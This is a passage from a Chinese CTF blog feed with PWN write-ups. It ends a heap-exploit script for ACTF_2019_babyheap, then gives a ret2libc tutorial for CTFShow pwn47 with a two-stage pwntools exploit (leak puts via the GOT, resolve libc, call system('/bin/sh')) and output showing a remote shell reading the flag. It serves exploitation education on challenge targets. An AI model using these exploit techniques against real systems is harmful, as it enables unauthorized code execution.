class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./ACTF_2019_babyheap&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25334</span>)</span><br><span class="line">binsh_addr = <span class="number">0x602010</span></span><br><span class="line">system_addr = <span class="number">0x4007A0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please input size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x100</span>) <span class="comment"># NodeA</span></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x100</span>) <span class="comment"># NodeB</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># delete NodeA</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># delete NodeB</span></span><br><span class="line">create(<span class="number">0x10</span>, p64(binsh_addr) + p64(system_addr)) <span class="comment"># modify NodeA</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.interactive()      </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc</title>
      <link href="/2024/08/25/retlibc/"/>
      <url>/2024/08/25/retlibc/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>ret2libc</code> 是一种在存在栈溢出漏洞的程序中利用动态链接库（ 如 <code>libc</code> ）中的函数来执行任意代码的方法</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>ret2libc</code> 控制函数执行 <code>libc</code> 中的函数，通常是返回某个函数的 <code>plt</code> 处或者函数的具体位置（即函数对应的 <code>got</code> 表项的内容）  </p><p>一般情况下，会执行 <code>system(&quot;/bin/sh&quot;)</code> 语句，但也可以使用 <code>execve</code> 函数或 <code>/sh</code> 参数</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul><li>存在溢出，且溢出的范围足够大，可以覆盖到 <code>main</code> 函数的返回地址</li><li><p>存在如 <code>puts</code> , <code>write</code> 等的打印函数可以被利用。在劫持程序的执行流程后，执行 <code>puts</code> , <code>write</code> 等函数打印一些已经执行过的函数的真实地址，以便寻找 <code>libc</code> 的基地址</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2></li><li><p>开启了 NX 保护，同时栈不可执行，不能使用 <code>ret2shellcode</code></p></li><li>程序本身没有如 <code>system(&#39;/bin/sh&#39;)</code> 的后门函数，不能直接使用 <code>ret2text</code></li><li>程序中既没 <code>system</code> 函数，也没 <code>/bin/sh</code> 字符串，需要在 <code>libc</code> 库中寻找</li></ul><p>由于这种题目需要判断 <code>libc</code> 的版本，需要使用到 <code>LibcSearcher</code> 这个库</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li>寻找一个函数的真实地址，以 <code>puts</code> 为例，构建合理的 <code>payload1</code> ，劫持程序的执行流程，使得程序执行 <code>puts</code> 打印得到 <code>puts</code> 函数的真实地址，并返回到 <code>main</code> 函数重新开始</li><li>根据泄露出的 <code>puts</code> 函数的真实地址的后三位，判断出 <code>libc</code> 库的版本（ <code>LibcSearcher</code> 或网站）</li><li>根据 <code>libc</code> 库的版本确定 <code>puts</code> 函数的偏移地址</li><li>计算 <script type="math/tex">基地址 = puts 函数的真实地址 - puts 函数的偏移地址</script></li><li>根据 <code>libc</code> 库的版本计算出 <code>system</code> 函数和 <code>&#39;/bin/sh&#39;</code> 字符串在 <code>libc</code> 库中的偏移地址</li><li>根据 $真实地址 = 基地址 + 偏移地址$ ，计算出 <code>system</code> 函数和 <code>&#39;/bin/sh&#39;</code> 字符串的真实地址</li><li>构造合理的 <code>payload2</code> ，劫持程序的执行流程，执行 <code>system(&#39;/bin/sh&#39;)</code> 从而拿到 <code>shell</code><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2></li></ol><p>以 CTFShow 中的 <code>pwn47</code> 为例</p><p>首先使用 <code>checksec</code> 工具检查编译出的文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ checksec --file=&#x27;./pwn&#x27; </span><br><span class="line">[*] &#x27;/home/kali/桌面/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以确认该程序为 32 位程序，栈不可执行，没有其他保护</p><p>利用 IDA 来反编译一下二进制程序</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/20240715151507.png" alt="image.png"></p><p>先查看 <code>main</code> 函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  logo();</span><br><span class="line">  puts(&quot;Give you some useful addr:\n&quot;);</span><br><span class="line">  printf(&quot;puts: %p\n&quot;, &amp;puts);</span><br><span class="line">  printf(&quot;fflush %p\n&quot;, &amp;fflush);</span><br><span class="line">  printf(&quot;read: %p\n&quot;, &amp;read);</span><br><span class="line">  printf(&quot;write: %p\n&quot;, &amp;write);</span><br><span class="line">  printf(&quot;gift: %p\n&quot;, useful);</span><br><span class="line">  putchar(10);</span><br><span class="line">  ctfshow();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现该函数泄露了 <code>puts</code> , <code>write</code> 等函数的地址（虽然也没啥用）</p><p>再查看可疑函数 <code>ctfshow</code></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">ctfshow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">152</span>]; <span class="comment">// [esp+Ch] [ebp-9Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Start your show time: &quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现该函数中一个非常明显的危险函数 <code>gets</code></p><p>该函数读取后写入的字符串 <code>s</code> 长度为 <code>152</code> ，离栈底的距离为 <code>0x9C</code> ，但是 <code>gets</code> 函数读取的数据长度没有限制，从而造成了栈溢出</p><p>字符串 <code>s</code> 离 <code>ebp</code> 的距离为 <code>0x9C</code>，那么相应的栈结构为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   +-----------------+</span><br><span class="line">   |     retaddr     |</span><br><span class="line">   +-----------------+</span><br><span class="line">   |     saved ebp   |</span><br><span class="line">ebp---&gt;+-----------------+</span><br><span class="line">   |                 |</span><br><span class="line">   |                 |</span><br><span class="line">   |                 |</span><br><span class="line">   |                 |</span><br><span class="line">   |                 |</span><br><span class="line">   |                 |</span><br><span class="line">s,ebp-0x9C--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>由于程序中没有 <code>system</code> 函数及相关函数地址，所以需要我们利用泄露出来的函数地址，通过 <code>libc</code> 库获得 <code>system</code> 函数的实际地址</p><p>通过 <code>ROPgadget</code> 函数可以查找到 <code>&#39;/bin/sh&#39;</code> 字符串，所以只需要得到 <code>system</code> 函数的地址就够了（没有 <code>&#39;/bin/sh&#39;</code> 字符串的可以用与得到 <code>system</code> 函数地址同样的操作得到 <code>&#39;/bin/sh&#39;</code> 字符串地址）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ROPgadget --binary &#x27;./pwn&#x27; --string &#x27;/bin/sh&#x27;</span><br><span class="line">/usr/local/bin/ROPgadget:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  __import__(&#x27;pkg_resources&#x27;).run_script(&#x27;ROPGadget==7.4&#x27;, &#x27;ROPgadget&#x27;)</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0804b028 : /bin/sh</span><br></pre></td></tr></table></figure><p>使用 <code>pwntools</code> 编写利用脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * <span class="comment"># 导入 LibcSearcher 库用于查找 libc 库版本</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28170</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>) <span class="comment"># 获取 elf 文件信息</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x804b028</span> <span class="comment"># /bin/sh 字符串的地址，如果没有可以参照下面操作获取</span></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 获取 main 函数地址</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 获取 puts 函数的 got 表地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 获取 puts 函数的 plt 表地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建 payload 用于泄露 puts 函数的地址从而获取基地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x9c</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="comment"># 获取输出，只需要前四个字节</span></span><br><span class="line">puts_addr = u32(r.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 puts 地址信息查找 libc 库信息</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取基地址</span></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 system 函数的真实地址</span></span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建 payload 用于获取 shell</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x9c</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(system) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行代码，可以得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ python shellcode.py</span><br><span class="line">[+] Opening connection to pwn.challenge.ctf.show on port 28170: Done</span><br><span class="line">[*] &#x27;/home/kali/桌面/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">/home/kali/桌面/shellcode.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.recvuntil(&quot;\n\n&quot;)</span><br><span class="line">/home/kali/桌面/shellcode.py:16: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  puts_addr = u32(r.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">0xf7e2f360</span><br><span class="line">[+] ubuntu-glibc (id libc6-i386_2.27-3ubuntu1_amd64) be choosed.</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Stack_Overflow                                          </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Ez ret2libc!                                            </span><br><span class="line">    * *************************************                           </span><br><span class="line">Give you some useful addr:</span><br><span class="line"></span><br><span class="line">puts: 0xf7e2f360</span><br><span class="line">fflush 0xf7e2d500</span><br><span class="line">read: 0xf7ead620</span><br><span class="line">write: 0xf7ead6f0</span><br><span class="line">gift: 0x804b028</span><br><span class="line"></span><br><span class="line">Start your show time: </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\x10M\xe0\xf7</span><br><span class="line">$                                          ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">pwn</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">$ cat flag</span><br><span class="line">ctfshow&#123;9d77e626-5bf6-465e-baf9-5177e16ac17f&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><p>可以看到我们已经得到了 <code>flag</code></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
